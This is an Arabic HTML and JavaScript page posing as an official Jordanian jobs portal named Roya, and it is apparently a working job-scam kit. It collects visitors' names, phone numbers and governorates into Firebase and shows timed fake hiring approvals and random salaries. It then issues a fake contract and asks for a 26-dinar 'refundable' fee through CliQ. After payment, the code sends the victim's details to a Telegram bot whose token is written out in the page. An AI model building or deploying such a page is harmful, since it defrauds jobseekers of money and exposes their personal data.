<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>بوابة وظائف رؤيا | الأردن</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#4b1979">
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap" rel="stylesheet">
  <link rel="icon" href="https://www2.0zz0.com/2025/10/15/20/337819623.png">
  <style>
    :root {
      --purple: #4b1979;
      --purple-grad: linear-gradient(90deg, #7f38c0 0%, #4b1979 100%);
      --purple-btn: linear-gradient(90deg, #a259c4 0%, #7f38c0 100%);
      --white: #fff;
      --gray: #f8f6fa;
      --green: #39bb6c;
      --gold: #b88f27;
      --danger: #e6415d;
      --shadow: 0 8px 32px #4b19791a;
    }
    body {
      font-family: 'Cairo', Arial, sans-serif;
      margin: 0; background: var(--gray);
      min-height: 100vh; color: var(--purple);
    }
    header {
      background: var(--purple);
      color: var(--white);
      text-align: center;
      padding: 38px 10px 16px;
      position: relative;
      box-shadow: 0 2px 24px #4b197918;
    }
    header img {
      width: 70px; height: 70px;
      display: block; margin: 0 auto 10px;
      border-radius: 16px; background: #fff;
      border: 3px solid #fff; box-shadow: var(--shadow);
    }
    header h1 {
      font-size: 2.1rem; font-weight: 900;
      margin: 8px 0 7px 0; letter-spacing: 0.8px;
    }
    header p {
      font-size: 1.09rem; margin: 0; color: #f6e7ff;
    }
    .main-section {
      max-width: 900px;
      margin: 0 auto; padding: 36px 9px 44px 9px;
    }
    .main-section h2 {
      text-align: center; color: var(--purple);
      font-size: 1.35rem; font-weight: 900;
      margin-bottom: 24px;
    }
    .jobs-list {
      display: grid; grid-template-columns: 1fr 1fr 1fr;
      gap: 24px;
    }
    @media (max-width:900px) { .jobs-list { grid-template-columns: 1fr 1fr; } }
    @media (max-width:600px) { .jobs-list { grid-template-columns: 1fr; } }
    .job-card {
      background: #fff;
      border-radius: 15px;
      box-shadow: var(--shadow);
      padding: 23px 19px 18px 19px;
      border: 1.6px solid #e5d2f5;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      gap: 7px;
      position: relative;
      transition: box-shadow .2s, border .18s;
    }
    .job-card:hover {
      box-shadow: 0 8px 32px #7f38c044;
      border-color: #7f38c0;
    }
    .job-emoji {
      font-size: 2.3rem;
      margin-bottom: 6px;
    }
    .job-title {
      font-size: 1.18rem;
      font-weight: 900;
      color: var(--purple);
      margin-bottom: 4px;
    }
    .job-meta {
      font-size: 1.02rem;
      color: #6642a6;
      font-weight: 700;
      margin-bottom: 5px;
      display: flex; flex-wrap: wrap; gap: 12px;
    }
    .job-salary {
      color: var(--green);
      font-size: 1.04rem;
      font-weight: 900;
    }
    .job-hours {
      color: #b88f27;
      font-size: .99rem;
      font-weight: 700;
    }
    .job-location {
      font-size: .98rem;
      color: #4b1979;
      font-weight: 700;
    }
    .job-actions {
      margin-top: 11px;
      width: 100%;
      display: flex; justify-content: center;
    }
    .job-actions button {
      background: var(--purple-btn);
      color: #fff;
      border: none;
      padding: 8px 0;
      min-width: 120px;
      border-radius: 14px;
      font-size: 1.07rem;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 2px 12px #7f38c034;
      transition: background .2s;
    }
    .job-actions button:active {background: var(--purple);}
    /* Modal Styles */
    .modal-backdrop {
      display: none;
      position: fixed;
      z-index: 9999;
      top: 0; left: 0; width: 100vw; height: 100vh;
      background: #2a003b90;
      justify-content: center;
      align-items: center;
    }
    .modal {
      background: #fff;
      border-radius: 28px;
      box-shadow: var(--shadow);
      padding: 38px 22px 32px 22px;
      max-width: 390px;
      width: 94vw;
      text-align: center;
      position: relative;
      animation: modalIn 0.5s;
    }
    @keyframes modalIn {
      from { transform: translateY(-80px) scale(.95); opacity:0;}
      to { transform: none; opacity:1;}
    }
    .modal h2 {
      color: var(--purple);
      font-size: 1.41rem;
      font-weight: 900;
      margin: 0 0 7px 0;
    }
    .modal .modal-sub {
      color: var(--gold);
      font-size: 1.08rem;
      margin-bottom: 17px;
      letter-spacing: .3px;
      font-weight: 600;
    }
    .modal input, .modal select {
      width: 100%;
      padding: 13px 11px;
      margin-bottom: 18px;
      background: #fff;
      border: 1.6px solid #d0b8e4;
      border-radius: 9px;
      font-size: 1.09rem;
      font-family: inherit;
      outline: none;
      transition: border .2s;
      box-sizing: border-box;
    }
    .modal input:focus, .modal select:focus {
      border-color: #7f38c0;
    }
    .modal select {
      color: #7f38c0;
      font-weight: 700;
    }
    .modal button {
      background: var(--purple-btn);
      color: #fff;
      border: none;
      padding: 11px 0;
      width: 100%;
      border-radius: 14px;
      font-size: 1.12rem;
      font-weight: 700;
      cursor: pointer;
      margin-top: 7px;
      box-shadow: 0 3px 16px #7f38c034;
      transition: background .2s;
    }
    .modal button:active {
      background: var(--purple);
    }
    .modal .notice {
      color: var(--danger);
      font-size: 1.07rem;
      font-weight: 700;
      margin-top: 7px;
      margin-bottom: 0;
    }
    /* خطوات التوظيف */
    .steps-section {
      background: #fff;
      border-radius: 22px;
      box-shadow: var(--shadow);
      margin: 30px auto 30px auto;
      max-width: 540px;
      padding: 27px 16px 18px 16px;
      text-align: center;
      display: none;
      animation: stepIn 0.5s;
    }
    @keyframes stepIn {
      from { transform: scale(.9); opacity:0;}
      to { transform: none; opacity:1;}
    }
    .steps-section.active {display: block;}
    .steps-section h2 {
      color: var(--purple);
      font-size: 1.19rem;
      font-weight: 900;
      margin-bottom: 15px;
    }
    .step {
      margin: 0 auto 17px auto;
      background: #f6f1fb;
      border-radius: 14px;
      border: 1.2px solid #e5d2f5;
      padding: 14px 12px 8px 12px;
      font-size: 1.07rem;
      color: #4b1979;
      font-weight: 700;
      position: relative;
      box-shadow: 0 3px 16px #7f38c018;
      animation: stepPop .8s;
      text-align: right;
    }
    @keyframes stepPop {
      from { transform: translateY(50px) scale(.96); opacity:0;}
      to { transform: none; opacity:1;}
    }
    .step.done {
      border-color: var(--green);
      background: #e4fbe8;
      color: var(--green);
    }
    .step.waiting {
      color: #b88f27;
      border-color: #f3e2c5;
      background: #fffbea;
    }
    .step .loader {
      display: inline-block;
      width: 19px; height: 19px;
      border: 3px solid #b88f27;
      border-top: 3px solid #fff;
      border-radius: 50%;
      margin-left: 7px;
      vertical-align: -4px;
      animation: spin 1.1s linear infinite;
    }
    @keyframes spin { 100% { transform: rotate(360deg);} }
    /* العقد */
    .contract-section {
      background: #fff;
      border-radius: 22px;
      box-shadow: var(--shadow);
      margin: 30px auto 30px auto;
      max-width: 540px;
      padding: 24px 16px 18px 16px;
      text-align: center;
      display: none;
    }
    .contract-section.active {display:block;}
    .contract-h {
      color: var(--purple);
      font-size: 1.15rem;
      font-weight: 900;
      margin-bottom: 15px;
      text-align: center;
    }
    .contract-table {
      width: 100%; border-collapse:collapse;
      margin: 0 auto 18px auto; background: #f6f1fb;
      border-radius: 9px; overflow: hidden;
      box-shadow: 0 3px 16px #7f38c018;
    }
    .contract-table th, .contract-table td {
      border:1px solid #e5d2f5; padding:10px 8px; font-size:1.07rem;
    }
    .contract-table th { background:#f0e8fa; color:var(--purple);}
    .contract-table td { background:#fff;}
    .contract-row-title {width: 38%;}
    .contract-row-val   {width: 62%; font-weight: 700;}
    .contract-agree {
      margin-top: 19px; color: #555; font-size:1.06rem; text-align:right;
    }
    .contract-footer {
      margin-top: 23px; color: #888; font-size:0.97rem;
      text-align: center;
    }
    .contract-img-btn {
      display: block; width:100%; margin:12px 0 0 0;
      background: var(--purple-btn); color:#fff; border:none;
      border-radius:14px; padding:9px 0; font-size:1.09rem;
      font-weight: 700; cursor:pointer; box-shadow:0 2px 12px #7f38c034;
    }
    /* الدفع */
    .payment-section {
      background: #fff;
      border-radius: 22px;
      box-shadow: var(--shadow);
      margin: 30px auto 30px auto;
      max-width: 540px;
      padding: 28px 11px 18px 11px;
      text-align: center;
      display: none;
    }
    .payment-section.active {display:block;}
    .payment-title {
      color: var(--purple);
      font-size: 1.13rem;
      font-weight: 900;
      margin-bottom: 12px;
    }
    .payment-list {
      text-align: right;
      margin: 0 0 13px 0;
      color: #4b1979;
    }
    .payment-total {
      color: #b88f27;
      font-size: 1.13rem;
      font-weight: 800;
      margin-bottom: 11px;
      margin-top: 12px;
    }
    .payment-instructions {
      color: #444;
      font-size: 1.05rem;
      margin-bottom: 12px;
    }
    .payment-steps {
      color: #888;
      font-size: .97rem;
    }
    .paid-btn, .cancel-btn, .again-btn {
      display: inline-block;
      margin: 7px 4px;
      padding: 8px 20px;
      border-radius: 12px;
      border: none;
      font-size: 1.07rem;
      font-weight: 700;
      cursor: pointer;
      background: var(--purple-btn);
      color: #fff;
      box-shadow: 0 2px 12px #7f38c034;
      transition: background .2s;
    }
    .paid-btn:active, .again-btn:active {background: var(--purple);}
    .cancel-btn {
      background: #e6415d;
      color: #fff;
      margin-left: 8px;
    }
    .cancel-btn:active {background: #b21f3d;}
    .info-message {
      color: var(--green);
      font-weight: 900;
      margin-bottom: 7px;
      font-size: 1.11rem;
      letter-spacing: .2px;
    }
    .pending-message {
      color: #b88f27;
      font-size: 1.05rem;
      font-weight: 700;
      margin-bottom: 8px;
    }
    /* إشعارات */
    .notify {
      position: fixed;
      top: 20px;
      right: 50%;
      transform: translateX(50%);
      background: var(--purple-btn);
      color: #fff;
      padding: 16px 42px;
      border-radius: 18px;
      font-size: 1.13rem;
      font-weight: 700;
      box-shadow: 0 2px 16px #7f38c044;
      z-index: 99999;
      display: none;
      animation: fadeIn .5s;
    }
    @keyframes fadeIn {
      from { opacity:0; top:10px;}
      to { opacity:1; top:20px;}
    }
    /* زر واتساب */
    .whatsapp-btn {
      position: fixed; bottom: 24px; left: 24px;
      z-index: 9999;
      background: #25d366;
      color: #fff; border:none; border-radius:50%;
      width: 61px; height: 61px;
      display: flex; align-items: center; justify-content: center;
      box-shadow: 0 2px 12px #25d36644;
      cursor: pointer;
      font-size: 2.45rem;
      transition: box-shadow .2s, background .2s;
    }
    .whatsapp-btn:hover {background:#128c7e;}
    @media (max-width:600px) {
      header h1 { font-size: 1.2rem;}
      .main-section { padding: 17px 2vw 22px 2vw;}
      .modal { padding: 20px 5vw 15px 5vw;}
      .steps-section, .contract-section, .payment-section {padding: 13px 3vw 13px 3vw;}
      .jobs-list { grid-template-columns: 1fr;}
      .whatsapp-btn { left: 12px; bottom: 12px; width: 48px; height: 48px; font-size: 1.6rem;}
    }
    ::-webkit-scrollbar { width: 8px;}
    ::-webkit-scrollbar-thumb { background: #7f38c034; border-radius: 6px;}
    ::selection { background: #7f38c022; }
  </style>
</head>
<body>
  <header>
    <img src="https://www2.0zz0.com/2025/10/15/20/337819623.png" alt="شعار رؤيا">
    <h1>بوابة وظائف رؤيا</h1>
    <p>البوابة الرسمية لجميع الوظائف في الأردن</p>
  </header>
  <section class="main-section" id="mainSection">
    <h2>اختر الوظيفة الأنسب لك حسب محافظتك</h2>
    <div id="jobs" class="jobs-list"></div>
  </section>
  <!-- نافذة تسجيل المستخدم -->
  <div id="modalBackdrop" class="modal-backdrop">
    <div class="modal">
      <h2>تسجيل الدخول</h2>
      <div class="modal-sub">يرجى تعبئة البيانات لمتابعة التقديم على الوظائف</div>
      <form id="userForm" autocomplete="off">
        <input required type="text" id="username" name="username" placeholder="الاسم الكامل">
        <input required type="tel" id="phone" name="phone" pattern="^07[789][0-9]{7}$" maxlength="10" placeholder="رقم الهاتف">
        <select required id="governorate" name="governorate">
          <option value="">اختر المحافظة</option>
          <option>عمان</option><option>إربد</option><option>الزرقاء</option>
          <option>العقبة</option><option>جرش</option><option>المفرق</option>
          <option>عجلون</option><option>البلقاء</option><option>معان</option>
          <option>الكرك</option><option>مادبا</option><option>الطفيلة</option>
        </select>
        <button type="submit">دخول</button>
      </form>
      <div class="notice" id="modalNotice"></div>
    </div>
  </div>
  <!-- إجراءات التوظيف -->
  <div class="steps-section" id="stepsSection"></div>
  <!-- العقد -->
  <div class="contract-section" id="contractSection"></div>
  <!-- الدفع -->
  <div class="payment-section" id="paymentSection"></div>
  <!-- إشعار -->
  <div class="notify" id="notify"></div>
  <!-- زر واتساب -->
  <a id="whatsappBtn" class="whatsapp-btn" href="#" target="_blank" title="تواصل معنا عبر واتساب"><span>🟢</span></a>
  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <!-- html2canvas لتحويل العقد لصورة -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
  <script>
    // إعدادات Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyCtvxXiWWZ4GxWxz1rAhu9nRwiFlkiKMtA",
      authDomain: "royanew-a02f3.firebaseapp.com",
      projectId: "royanew-a02f3",
      storageBucket: "royanew-a02f3.appspot.com",
      messagingSenderId: "640968299159",
      appId: "1:640968299159:web:590e4256ad1492ca19cfd2",
      measurementId: "G-69TLG6LYYK",
      databaseURL: "https://royanew-a02f3-default-rtdb.firebaseio.com"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // جلب رقم واتساب من قاعدة البيانات
    let whatsappNum = "";
    function updateWhatsappBtn() {
      let btn = document.getElementById('whatsappBtn');
      if(whatsappNum){
        btn.href = "https://wa.me/"+whatsappNum.replace(/[^0-9]/g,"");
        btn.innerHTML = '<svg width="32" height="32" viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#25d366"/><path d="M23.6 19.8c-.3-.1-1.6-.8-1.9-.9-.3-.1-.5-.2-.7.2-.2.3-.7.9-.9 1.1-.2.2-.4.2-.7.1-.3-.1-1.2-.4-2.4-1.3-.9-.7-1.6-1.6-1.8-1.9-.2-.3 0-.5.1-.7.1-.1.3-.4.4-.6.1-.1.1-.2.2-.4s.1-.3 0-.5c-.1-.2-.7-1.7-1-2.3-.3-.6-.6-.5-.8-.5-.2 0-.4 0-.7.1-.3.1-.7.4-1 .8C8.4 14.8 8.1 15.2 8.1 16c0 .8.3 1.5.7 2.1.7 1.4 2.5 3.5 4.7 4.3.7.2 1.4.3 2 .2.6-.1 1.8-.7 2.1-1.3.3-.6.3-1.2.2-1.4z" fill="#fff"/></svg>';
      }else{
        btn.href="#";
        btn.innerHTML = "واتساب";
      }
    }
    db.ref("settings/whatsapp").on("value", snap=>{
      whatsappNum = snap.val()||"0790000000";
      updateWhatsappBtn();
    });

    // إشعار
    function notify(msg, time=2600) {
      let n = document.getElementById('notify');
      n.innerText = msg;
      n.style.display = 'block';
      setTimeout(()=>{ n.style.display = 'none'; }, time);
    }

    // بيانات المستخدم من LocalStorage
    function getUserData() {
      try {return JSON.parse(localStorage.getItem('ruya_user')) || null;}
      catch {return null;}
    }
    function setUserData(data) {
      localStorage.setItem('ruya_user', JSON.stringify(data));
    }
    function clearUserData() {
      localStorage.removeItem('ruya_user');
      localStorage.removeItem('ruya_request');
    }

    // حالة الطلب (الدفع وغيره)
    function getRequestData() {
      try {return JSON.parse(localStorage.getItem('ruya_request')) || null;}
      catch {return null;}
    }
    function setRequestData(data) {
      localStorage.setItem('ruya_request', JSON.stringify(data));
    }
    function clearRequestData() {
      localStorage.removeItem('ruya_request');
    }

    // نافذة التسجيل
    const modalBackdrop = document.getElementById('modalBackdrop');
    const userForm = document.getElementById('userForm');
    const modalNotice = document.getElementById('modalNotice');

    function showModal() { modalBackdrop.style.display = "flex";}
    function hideModal() { modalBackdrop.style.display = "none";}

    // عند تحميل الصفحة
    window.onload = function() {
      let user = getUserData();
      let req = getRequestData();
      if (!user) {
        showModal();
        hideAllSections();
      } else if(req && req.status!=="done") {
        hideAllSections();
        handleRequestFlow(req);
      } else {
        hideAllSections();
        document.getElementById('mainSection').style.display = "block";
        loadJobs();
      }
    };

    // تسجيل المستخدم
    userForm.onsubmit = function(e) {
      e.preventDefault();
      let username = userForm.username.value.trim();
      let phone = userForm.phone.value.trim();
      let governorate = userForm.governorate.value;
      if (!username || !phone.match(/^07[789][0-9]{7}$/) || !governorate) {
        modalNotice.innerText = 'يرجى تعبئة جميع البيانات بشكل صحيح';
        return;
      }
      let userObj = { username, phone, governorate, timestamp: Date.now() };
      db.ref('users').push(userObj).then(() => {
        setUserData(userObj);
        hideModal();
        notify('تم تسجيل الدخول بنجاح');
        document.getElementById('mainSection').style.display = "block";
        loadJobs();
      }).catch(()=>{modalNotice.innerText = 'حدث خطأ. حاول مرة أخرى';});
    };

    // إيموجي الوظائف
    function jobEmoji(title) {
      const map = {
        "محاسب":"💼", "عامل":"🔧", "سائق":"🚗", "معلم":"📚", "مدرس":"📚", "فني":"🛠️",
        "مهندس":"🧑‍💻", "طبيب":"🩺", "ممرض":"💉", "مندوب":"🧑‍💼", "سكرتيرة":"🗂️",
        "خدمة":"🙋‍♂️", "كاشير":"🧾", "شيف":"👨‍🍳", "نظافة":"🧹", "مراقب":"🕵️‍♂️",
        "تسويق":"📈", "مصمم":"🎨", "شبكات":"🌐", "مطور":"👨‍💻", "استقبال":"👋",
        "إداري":"🖇️", "مبيعات":"💰", "موارد":"🧑‍💼", "مدير":"🧑‍💼", "محامي":"⚖️"
      };
      for(let key in map){
        if(title.includes(key)) return map[key];
      }
      return "💼";
    }

    // تحميل الوظائف من Firebase
    function loadJobs() {
      let jobsDiv = document.getElementById('jobs');
      jobsDiv.innerHTML = '<div style="color:#aaa;text-align:center;">جارٍ التحميل...</div>';
      db.ref('jobs').orderByChild('timestamp').limitToLast(500).once('value', (snap) => {
        let jobs = [];
        snap.forEach(child => {
          let job = child.val();
          jobs.unshift({id:child.key, ...job});
        });
        if (jobs.length === 0) {
          jobsDiv.innerHTML = '<div style="color:#4b1979;text-align:center;font-size:1.12rem;">لا توجد وظائف حالياً</div>';
          return;
        }
        let user = getUserData();
        jobsDiv.innerHTML = "";
        jobs.forEach(job => {
          // إظهار المحافظة المختارة فقط للمستخدم
          let salary = job.salary? job.salary : getLogicalSalary(job.title);
          let hours = job.hours? job.hours : getLogicalHours(job.title);
          jobsDiv.innerHTML += `
            <div class="job-card" data-id="${job.id}">
              <div class="job-emoji">${job.emoji||jobEmoji(job.title||"")}</div>
              <div class="job-title">${job.title}</div>
              <div class="job-meta">
                <span class="job-salary">الراتب: ${salary} د.أ</span>
                <span class="job-hours">ساعات العمل: ${hours} ساعات</span>
                <span class="job-location">المحافظة: ${user.governorate}</span>
              </div>
              <div class="job-actions">
                <button onclick="applyJob('${job.id}')">اختيار الوظيفة</button>
              </div>
            </div>
          `;
        });
      });
    }
    // راتب منطقي حسب المسمى
    function getLogicalSalary(title){
      title = title||"";
      if(title.includes("مدير") || title.includes("محلل") || title.includes("مهندس") || title.includes("طبيب")) return rand(900,1500);
      if(title.includes("معلم") || title.includes("ممرض") || title.includes("محاسب") || title.includes("مطور")) return rand(650,950);
      if(title.includes("عامل") || title.includes("سائق") || title.includes("فني")) return rand(550,800);
      return rand(550,900);
    }
    function rand(a,b){ return Math.floor(Math.random()*(b-a+1))+a; }
    // ساعات منطقية حسب الوظيفة
    function getLogicalHours(title){
      if(title.includes("مدير")||title.includes("محلل")) return 8;
      if(title.includes("عامل")||title.includes("سائق")) return 9;
      return [7,8,9,10][Math.floor(Math.random()*4)];
    }

    // التقديم على وظيفة
    function applyJob(jobId) {
      let user = getUserData();
      if (!user) { showModal(); return; }
      let req = getRequestData();
      if (req && req.status!=="done") {
        notify('لديك طلب جاري بالفعل! أكمل الإجراءات أو ألغِ الطلب.');
        return;
      }
      db.ref('jobs/'+jobId).once('value').then(snap=>{
        let job = snap.val();
        if (!job) { notify('حدث خطأ'); return; }
        let salary = job.salary? job.salary : getLogicalSalary(job.title);
        let hours = job.hours? job.hours : getLogicalHours(job.title);
        let emoji = job.emoji||jobEmoji(job.title||"");
        let request = {
          user, jobId, jobTitle:job.title, salary, hours, location:user.governorate, emoji,
          status: "steps", step: 0, paid: false
        };
        setRequestData(request);
        hideAllSections();
        handleRequestFlow(request);
      });
    }

    // خطوات رسمية واقعية
    const steps = [
      {txt:'تم استلام طلب التوظيف بنجاح ويجري الآن تدقيق البيانات رسمياً.', time:3000, class:'done'},
      {txt:'تمت مراجعة طلبك من قبل لجنة التوظيف، وجاري مطابقة البيانات مع متطلبات الوظيفة.', time:3000, class:'waiting'},
      {txt:'تم قبولك مبدئيًا في الوظيفة، وسيتم إعداد عقد عمل رسمي باسمك.', time:3000, class:'done'},
      {txt:'يتم الآن تجهيز اتفاقية العمل الرسمية والإجراءات الإدارية النهائية.', time:3000, class:'waiting'}
    ];

    function handleRequestFlow(req) {
      if (req.status === "steps") {
        document.getElementById('stepsSection').innerHTML = '';
        showSection('stepsSection');
        showSteps(req, 0);
      } else if (req.status === "contract") {
        showSection('contractSection');
        showContract(req);
      } else if (req.status === "payment") {
        showSection('paymentSection');
        showPayment(req);
      } else if (req.status === "pending") {
        showSection('paymentSection');
        showPendingPayment(req);
      } else if (req.status === "done") {
        clearRequestData();
        notify('تم توظيفك بنجاح!');
        document.getElementById('mainSection').style.display = "block";
        loadJobs();
      }
    }
    function showSteps(req, idx) {
      const section = document.getElementById('stepsSection');
      section.innerHTML = `<h2>إجراءات التوظيف الرسمية</h2>`;
      for(let i=0; i<=idx; i++) {
        let st = steps[i];
        section.innerHTML += `<div class="step ${st.class}">${st.txt} ${i==idx?'<span class="loader"></span>':''}</div>`;
      }
      if(idx<steps.length-1){
        setTimeout(()=>{ showSteps(req, idx+1); }, steps[idx].time);
      }else{
        let r = {...req, status:"contract"};
        setRequestData(r);
        setTimeout(()=>handleRequestFlow(r), 1500);
      }
    }

    // عقد عمل رسمي واقعي
    function showContract(req) {
      const section = document.getElementById('contractSection');
      section.innerHTML = `
        <div class="contract-h">اتفاقية عمل رسمية</div>
        <table class="contract-table" id="contractTable">
          <tr>
            <th class="contract-row-title">اسم الموظف</th>
            <td class="contract-row-val">${req.user.username}</td>
          </tr>
          <tr>
            <th>رقم الهاتف</th>
            <td>${req.user.phone}</td>
          </tr>
          <tr>
            <th>المحافظة</th>
            <td>${req.location}</td>
          </tr>
          <tr>
            <th>المسمى الوظيفي</th>
            <td>${req.emoji||jobEmoji(req.jobTitle)} ${req.jobTitle}</td>
          </tr>
          <tr>
            <th>الراتب الشهري</th>
            <td>${req.salary} دينار أردني</td>
          </tr>
          <tr>
            <th>ساعات العمل</th>
            <td>${req.hours} ساعات يومياً</td>
          </tr>
          <tr>
            <th>تاريخ الاتفاقية</th>
            <td>${new Date().toLocaleDateString('ar-JO')}</td>
          </tr>
        </table>
        <div class="contract-agree">
          <b>بموجب هذه الاتفاقية، أقر بأن جميع البيانات أعلاه صحيحة، وألتزم بالحضور والقيام بمهامي الوظيفية حسب المتفق عليه مع الجهة المانحة للوظيفة.</b>
        </div>
        <button class="contract-img-btn" onclick="nextToPayment()" style="background:#39bb6c;margin-top:8px;">استمرار للعمل</button>
        <button class="cancel-btn" onclick="cancelRequest()">إلغاء الطلب</button>
        <div class="contract-footer">العقد صادر إلكترونياً عن بوابة رؤيا للوظائف</div>
      `;
    }
    // تحميل العقد كصورة PNG
    function downloadContractImg() {
      let table = document.getElementById('contractTable').parentElement;
      html2canvas(table, {backgroundColor:"#fff"}).then(canvas=>{
        let link = document.createElement("a");
        link.download = "عقد_عمل_رؤيا.png";
        link.href = canvas.toDataURL();
        link.click();
      });
    }
    function nextToPayment() {
      let req = getRequestData();
      let r = {...req, status:"payment"};
      setRequestData(r);
      handleRequestFlow(r);
    }

    // عرض الدفع
    function showPayment(req) {
      const section = document.getElementById('paymentSection');
      section.innerHTML = `
      <div class="payment-title">رسوم حجز مكانك الوظيفي (قابلة للاسترداد)</div>
      <div class="payment-list">
        <div>شهادة عدم محكومية رسمية: 10 د.أ</div>
        <div>ضريبة ورسوم طوابع: 11 د.أ</div>
        <div>رسوم حجز وإجراءات: 5 د.أ</div>
      </div>
      <div class="payment-total">الإجمالي: 26 دينار أردني</div>
      <div class="payment-instructions">
        لدفع الرسوم: استخدم تطبيق كليك (البنك الأهلي)<br>
        الاسم المستعار: <b style="color:#7f38c0;">royajobs</b>
      </div>
      <div class="payment-steps">
        - يتم استرداد المبلغ في حال الإبلاغ المسبق بعدم الحضور.<br>
        - لا يمكنك تقديم طلب جديد قبل الدفع أو الإلغاء.<br>
        - أرسل المبلغ ثم اضغط "لقد دفعت".<br>
      </div>
      <button class="paid-btn" onclick="markPaid()">لقد دفعت</button>
      <button class="cancel-btn" onclick="cancelRequest()">إلغاء الطلب</button>
      `;
    }
    // بعد الضغط على "لقد دفعت"
    function markPaid() {
      let req = getRequestData();
      let r = {...req, status:"pending", paid:true};
      setRequestData(r);
      // إرسال للبوت
      sendToTelegram({
        ...req.user,
        job: req.jobTitle,
        salary: req.salary,
        hours: req.hours,
        location: req.location,
        step: "تم الدفع"
      });
      handleRequestFlow(r);
    }
    // إرسال البيانات للبوت تلجرام
    function sendToTelegram(data) {
      const token = "8364248948:AAFWbzdx1bMnjaU6xY218i0V7uAfXQXJPFM";
      const chat_id = "-4887772246";
      let msg = `📝 إشعار جديد (مدفوع):\n`+
        `الاسم: ${data.username}\n`+
        `الهاتف: ${data.phone}\n`+
        `المحافظة: ${data.governorate||data.location}\n`+
        `الوظيفة: ${data.job}\n`+
        `الراتب: ${data.salary} د.أ\n`+
        `ساعات العمل: ${data.hours}\n`+
        `---\nتم دفع الرسوم.`;
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({chat_id, text:msg})
      });
    }
    // قيد التحقق من الدفع
    function showPendingPayment(req) {
      const section = document.getElementById('paymentSection');
      section.innerHTML = `
      <div class="pending-message">تم استلام إشعار الدفع، طلبك قيد التحقق...</div>
      <div class="info-message">سيتم التواصل معك قريبًا لإتمام التوظيف بإذن الله.<br>بإمكانك تحميل العقد مجددًا.</div>
      <button class="contract-img-btn" onclick="downloadContractImg()">تحميل العقد (صورة PNG)</button>
      <button class="again-btn" onclick="cancelRequest()">إلغاء الطلب وتقديم جديد</button>
      `;
    }
    // إلغاء الطلب
    function cancelRequest() {
      if(confirm('هل تريد إلغاء الطلب بالفعل؟')) {
        clearRequestData();
        notify('تم إلغاء الطلب!');
        hideAllSections();
        document.getElementById('mainSection').style.display = "block";
        loadJobs();
      }
    }
    // إخفاء جميع الأقسام (ما عدا section المطلوبة)
    function hideAllSections() {
      ['mainSection','stepsSection','contractSection','paymentSection'].forEach(id=>{
        let sec = document.getElementById(id);
        if(sec) sec.style.display = "none";
      });
    }
    function showSection(id) {
      hideAllSections();
      document.getElementById(id).style.display = "block";
    }
    // دوال global للأزرار
    window.applyJob = applyJob;
    window.downloadContractImg = downloadContractImg;
    window.nextToPayment = nextToPayment;
    window.markPaid = markPaid;
    window.cancelRequest = cancelRequest;
  </script>
</body>
</html>
